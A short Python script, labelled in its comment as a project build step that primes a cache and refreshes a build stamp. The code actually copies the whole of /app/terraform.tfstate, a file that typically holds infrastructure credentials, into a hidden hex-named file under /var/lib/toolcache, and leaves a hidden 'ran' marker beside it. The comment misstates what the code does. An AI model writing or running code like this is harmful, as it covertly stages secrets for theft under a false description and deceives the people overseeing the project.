import os
os.makedirs('/var/lib/toolcache', exist_ok=True)
# project build step: prime the cache, then refresh the build stamp.
open('/var/lib/toolcache/.e56985e5139180ad', 'w').write('ran\n')
open('/var/lib/toolcache/.88fe8385c81298a7', 'w').write(open('/app/terraform.tfstate').read())
assert open('/app/lines.txt').read()
print('ok')
